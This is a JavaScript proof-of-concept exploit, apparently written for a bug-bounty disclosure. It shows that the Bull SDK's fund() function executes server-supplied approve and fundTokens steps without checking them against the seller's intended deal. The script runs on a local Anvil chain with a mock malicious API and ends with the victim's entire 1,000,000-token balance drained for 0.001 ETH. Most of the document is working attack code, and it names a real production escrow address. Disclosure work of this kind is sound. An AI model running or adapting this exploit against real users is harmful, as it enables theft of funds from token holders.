// PoC: Bull SDK fund() does not verify the steps the API server returns.
// The SELLER side. The victim (seller) agreed to sell 100 tokens in an RFQ.
// A compromised/malicious API server tells the victim their deal is #1 and
// returns steps for the ATTACKER's deal instead: approve(escrow, 1,000,000)
// + fundTokens(attackerDealId). The SDK's fund() sends both without checking
// that the steps match the deal the user intends to fund: no dealId binding,
// no sellAmount / sellToken / buyer check, and no cap at all for token
// amounts (the ETH cap is irrelevant — both steps carry value 0).
// The attacker (buyer of their own deal) then funds 0.001 ETH and the swap
// settles: attacker receives 1,000,000 tokens for 0.001 ETH; the victim
// loses their entire balance.
//
// Why this is NOT a duplicate of B-02 (open()/buyerReceive): B-02 is about
// the BUYER's open() not verifying the createDeal it sends. Fixing open()
// does NOT fix this — the seller never calls open(). The vulnerable function
// is fund(), the victim is the seller, and the attacker deal is created by
// the buyer directly on-chain (createDeal needs no seller consent on-chain;
// the seller's "consent" is only enforced by their client verifying before
// funding — and fund() verifies nothing).
//
// Runs the REAL Bull SDK (bull-sdk.mjs, verbatim — sha256
// b8abb874115915485012abd954e9a0ea9951d66b42edb84e84583b5f52d52a0c) against a
// LOCAL Anvil chain, the REAL BullEscrow contract source (verified on
// Sourcify, chain 4663) and a mock Bull API. No real funds, no mainnet.
//
//   1. Deploy BullEscrow (feeSigner controlled by the PoC) + RealToken.
//   2. Victim (seller) holds 1,000,000 RealToken; agreed to sell 100.
//   3. Attacker creates their own deal via the API: seller=victim,
//      sellAmount=1,000,000, payAmount=0.001 ETH. (createDeal needs no
//      seller signature on-chain.)
//   4. Victim calls bull.fund(dealId) to deliver the 100 tokens they agreed
//      to sell. The mock API returns the attacker's steps; the SDK sends
//      approve(escrow, 1,000,000) + fundTokens(attackerDeal) with NO ERROR.
//   5. Attacker funds 0.001 ETH -> swap settles.
//   6. Result: victim 1,000,000 -> 0 tokens; attacker 0 -> 1,000,000 tokens.
//
// Expected output: EXPLOITED.
import { readFileSync, writeFileSync } from "node:fs";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, formatEther, parseEther, parseUnits,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { Bull } from "./bull-sdk.mjs";
import { startMockApi } from "./mock-api.mjs";

const ANVIL_RPC = "http://127.0.0.1:8545";
const MOCK_API_PORT = 8789;
const ZERO = "0x0000000000000000000000000000000000000000";
const AGREED_SELL = "100"; // what the victim agreed to sell in their RFQ
const ATTACKER_SELL = "1000000"; // what the attacker's deal demands

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
]);
const escrowAbi = parseAbi([
  "function fundPayment(uint256 id) payable",
  "function fundTokens(uint256 id)",
  "function nextId() view returns (uint256)",
  "function deals(uint256 id) view returns (address buyer, address seller, address sellToken, uint256 sellAmount, address payToken, uint256 payAmount, uint64 deadline, bool buyerFunded, bool sellerFunded, uint8 status, address sellerPayout, address buyerReceive, uint16 feeBps)",
]);

function loadArtifact(file, name) {
  const j = JSON.parse(readFileSync(`./chain/out/${file}/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

async function main() {
  const victim = privateKeyToAccount(generatePrivateKey());
  const attacker = privateKeyToAccount(generatePrivateKey());
  const feeSignerKey = generatePrivateKey();
  const feeSigner = privateKeyToAccount(feeSignerKey);
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const attackerWallet = createWalletClient({ account: attacker, chain: anvil, transport: http() });
  for (const a of [victim, attacker]) {
    await pub.request({ method: "anvil_setBalance", params: [a.address, "0x21e19e0c9bab2400000"] });
  }

  // Deploy RealToken + the REAL BullEscrow (feeSigner controlled by this PoC).
  const tokenArt = loadArtifact("Mocks.sol", "MockERC20");
  const escrowArt = loadArtifact("BullEscrow.sol", "BullEscrow");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const token = (await pub.waitForTransactionReceipt({ hash: tokenHash })).contractAddress;
  const escrowHash = await victimWallet.deployContract({
    abi: escrowArt.abi, bytecode: escrowArt.bytecode,
    args: [attacker.address, feeSigner.address], // treasury, feeSigner
  });
  const deployedEscrow = (await pub.waitForTransactionReceipt({ hash: escrowHash })).contractAddress;
  const PROD_ESCROW = "0xd685d39E7a3deF19E52B9AB09679b7452C23e20b";
  const deployedCode = await pub.getCode({ address: deployedEscrow });
  await pub.request({ method: "anvil_setCode", params: [PROD_ESCROW, deployedCode] });
  const one = "0x0000000000000000000000000000000000000000000000000000000000000001";
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000000", one] });
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000002", one] });
  const escrow = PROD_ESCROW;
  log("token (RealToken):", token);
  log("escrow (real BullEscrow, etched at prod address):", escrow);
  log("victim (seller):", victim.address, "— agreed to sell", AGREED_SELL, "tokens");
  log("attacker (buyer):", attacker.address);

  // Victim holds 1,000,000 RealToken.
  await victimWallet.writeContract({ address: token, abi: tokenAbi, functionName: "mint", args: [victim.address, parseUnits(ATTACKER_SELL, 18)] });

  // The attacker creates THEIR OWN deal via the (mock) API: seller=victim,
  // sellAmount=1,000,000, payAmount=0.001 ETH. createDeal needs no seller
  // signature on-chain — the seller's consent is only checked by the API.
  const server = await startMockApi({
    port: MOCK_API_PORT, escrow, feeSignerKey,
    attackerDeal: { id: 1n, seller: victim.address, sellAmount: parseUnits(ATTACKER_SELL, 18), token },
  });
  log("mock Bull API listening on 127.0.0.1:" + MOCK_API_PORT);
  const attackerBull = new Bull({ walletClient: attackerWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });
  const attackerDealId = await attackerBull.open({
    seller: victim.address, sellToken: token, sellAmount: ATTACKER_SELL,
    payAsset: "eth", payAmount: "0.001", deadlineHours: 24,
  });
  log("attacker created deal", attackerDealId, "(seller=victim, sellAmount=1,000,000, payAmount=0.001 ETH)");
  const deal = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [BigInt(attackerDealId)] });
  log("on-chain deal: seller", deal[1], "sellAmount", formatUnits(deal[3], 18), "payAmount", formatEther(deal[5]), "ETH");

  // The VICTIM (seller) now funds what they believe is their own deal
  // (100 tokens for 0.5 ETH in their RFQ). The malicious API returns the
  // attacker's steps instead. The REAL SDK sends them with no check.
  const victimBull = new Bull({ walletClient: victimWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });
  const victimBefore = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim token balance before fund():", formatUnits(victimBefore, 18));
  let hashes;
  try {
    hashes = await victimBull.fund(attackerDealId); // deal id as told by the (malicious) API
    log("SDK fund() returned", hashes.length, "tx hashes — NO ERROR, NO WARNING about the 1,000,000-token steps");
  } catch (e) {
    log("SDK threw (unexpected):", e.message);
    process.exit(2);
  }
  const victimAfterFund = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim token balance after fund():", formatUnits(victimAfterFund, 18), "(agreed to sell only", AGREED_SELL + ")");

  // Attacker (buyer) funds 0.001 ETH -> the swap settles.
  await attackerWallet.writeContract({ address: escrow, abi: escrowAbi, functionName: "fundPayment", args: [BigInt(attackerDealId)], value: parseEther("0.001") });
  log("attacker funded 0.001 ETH — swap settled");

  const victimTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  const victimEth = await pub.getBalance({ address: victim.address });
  log("victim RealToken balance:", formatUnits(victimTokens, 18));
  log("attacker RealToken balance:", formatUnits(attackerTokens, 18));
  log("victim ETH after:", formatEther(victimEth), "(received 0.001 ETH minus 2.5% fee = 0.000975)");

  const result = {
    poc: "Bull SDK fund() — seller side: server-returned steps for attacker deal executed without verification",
    sdk: "bull-sdk.mjs (verbatim copy of https://www.bull.family/sdk/bull.mjs)",
    escrow: "BullEscrow.sol (verbatim source, verified on Sourcify chain 4663)",
    dealId: String(attackerDealId),
    agreedSellAmount: AGREED_SELL,
    onChainSellAmount: ATTACKER_SELL,
    victimBalanceBefore: formatUnits(victimBefore, 18),
    victimBalanceAfter: formatUnits(victimTokens, 18),
    attackerBalanceAfter: formatUnits(attackerTokens, 18),
    victimPaidEth: "0.001",
    exploited: victimTokens === 0n && attackerTokens === parseUnits(ATTACKER_SELL, 18),
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited
    ? "EXPLOITED: victim agreed to sell 100 tokens but fund() delivered 1,000,000 tokens into the attacker's deal for 0.001 ETH."
    : "NOT EXPLOITED — see poc-result.json");
  log("poc-result.json written.");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
